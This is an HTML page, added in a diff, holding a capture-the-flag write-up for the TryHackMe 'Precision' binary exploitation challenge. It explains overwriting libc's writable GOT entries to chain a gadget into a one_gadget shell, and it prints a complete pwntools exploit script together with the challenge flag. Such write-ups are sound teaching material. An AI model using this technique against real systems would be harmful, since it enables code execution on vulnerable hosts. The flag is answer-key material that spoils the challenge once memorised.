@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Precision was a binary exploitation challenge in which the main() function offered two absolute-address 8-byte writes. Although the binary applied Full RELRO, l">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Precision - TryHackMe Hackfinity Battle (PWN) - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Precision - TryHackMe Hackfinity Battle (PWN) - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Precision - TryHackMe Hackfinity Battle (PWN)</h1>
+<p class="writeup-meta"><span class="tag">PWN</span> <span class="tag diff diff-hard">Hard</span></p>
+<div class="writeup-content">
+<p><strong>Flag:</strong> <code>THM{t4k3_a_chance_with_precision_THMpwn}</code></p>
+<p>Precision was a binary exploitation challenge in which the main() function offered two absolute-address 8-byte writes. Although the binary applied Full RELRO, libc's internal GOT remained writable. The two writes were chained during perror's internal strlen call to redirect execution to a one-shot gadget, spawning a shell and capturing the flag.</p>
+<h2>Target</h2>
+<ul>
+<li>IP: <code>10.67.140.55:9004</code></li>
+<li>Binary: <code>precision</code> (PIE, Full RELRO, not stripped)</li>
+<li>libc: glibc 2.35 (supplied, loaded via custom <code>ld-linux-x86-64.so.2</code>)</li>
+</ul>
+<h2>Vulnerability</h2>
+<p>The <code>main()</code> function provides two absolute-address arbitrary 8-byte writes via <code>fread()</code>:</p>
+<pre><code>void *ptr = (void *)getint();          // user-controlled address (from strtoul)
+write(1, &quot;\nFirst chance: &quot;, 15);
+fread(ptr, 8, 1, stdin);               // 8-byte write to arbitrary address
+
+void *ptra = (void *)getint();
+write(1, &quot;\nSecond chance: &quot;, 16);
+fread(ptra, 8, 1, stdin);</code></pre>
+<p>After both writes, the binary calls <code>perror(&quot;!&quot;)</code> then <code>_exit(1337)</code>.</p>
+<p>The binary's GOT is <strong>Full RELRO</strong> (read-only), but <strong>libc's internal GOT (<code>.got.plt</code>)</strong> at offsets <code>0x219000–0x2191c8</code> is writable. The leak provides <code>_IO_2_1_stdout_</code> address, revealing libc base.</p>
+<h2>Solution</h2>
+<p>Two writes targeting adjacent libc GOT entries, chained during <code>perror</code>'s internal <code>strlen</code> call:</p>
+<h3>Write 1: <code>got.strlen</code> (libc + <code>0x219098</code>) → <code>mov rdx, r12</code> gadget (<code>0x176df7</code>)</h3>
+<p>The gadget:</p>
+<pre><code>mov rdx, r12    ; rdx = r12 (0 at strlen call site)
+sub rdx, rsi    ; rdx = 0 (rsi is also 0)
+call 0x283e0    ; calls mempcpy PLT stub → GOT[__mempcpy]</code></pre>
+<h3>Write 2: <code>got.__mempcpy</code> (libc + <code>0x219040</code>) → one_gadget <code>0xebcf8</code></h3>
+<p>One-gadget constraints: <code>[rsi] == NULL</code>, <code>[rdx] == NULL</code> — satisfied because rsi=0 and the gadget clears rdx.</p>
+<h3>Chain</h3>
+<pre><code>perror(&quot;!&quot;)
+  → __fxprintf → __vfprintf_internal
+    → strlen()
+      → GOT[strlen] (overwritten) → mov rdx, r12 gadget
+        → rdx = 0 (envp cleared)
+        → call mempcpy PLT
+          → GOT[__mempcpy] (overwritten) → one_gadget 0xebcf8
+            → execve(&quot;/bin/sh&quot;, rsi=0, rdx=0) → SHELL</code></pre>
+<h2>Exploit script</h2>
+<p>See <code>exploit_writeup.py</code> in this directory.</p>
+<pre><code>from pwn import *
+
+HOST = &#x27;10.67.140.55&#x27;
+PORT = 9004
+libc = ELF(&#x27;./libc.so.6&#x27;)
+
+r = remote(HOST, PORT)
+r.recvuntil(b&#x27;Coordinates: &#x27;)
+leak = int(r.recvline().strip(), 16)
+libc_base = leak - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]
+
+GOT_STRLEN = 0x219098
+GOT_MEMPCPY = 0x219040
+ONE_GADGET = 0xebcf8
+MOV_RDX = 0x176df7
+
+r.sendlineafter(b&#x27;&gt;&gt; &#x27;, str(libc_base + GOT_STRLEN).encode())
+r.sendafter(b&#x27;First chance: &#x27;, p64(libc_base + MOV_RDX))
+
+r.sendlineafter(b&#x27;&gt;&gt; &#x27;, str(libc_base + GOT_MEMPCPY).encode())
+r.sendafter(b&#x27;Second chance: &#x27;, p64(libc_base + ONE_GADGET))
+
+r.interactive()</code></pre>
+<h2>Key insights</h2>
+<ul>
+<li>Full RELRO on the binary is irrelevant — we target <strong>libc's writable GOT</strong> instead.</li>
+<li><code>perror()</code> internally calls <code>strlen</code> via <code>__vfprintf_internal</code>, making <code>got.strlen</code> the ideal hijack point.</li>
+<li>One-gadget <code>0xebcf8</code> needs <code>rdx = 0</code> (envp). The <code>mov rdx, r12</code> gadget (<code>0x176df7</code>) clears rdx and then calls through <code>got.__mempcpy</code>, redirecting to the one-gadget with satisfied constraints.</li>
+<li>The <code>call 0x283e0</code> inside the gadget is the <code>__mempcpy</code> PLT stub in libc, which jumps through <code>got.__mempcpy</code>.</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
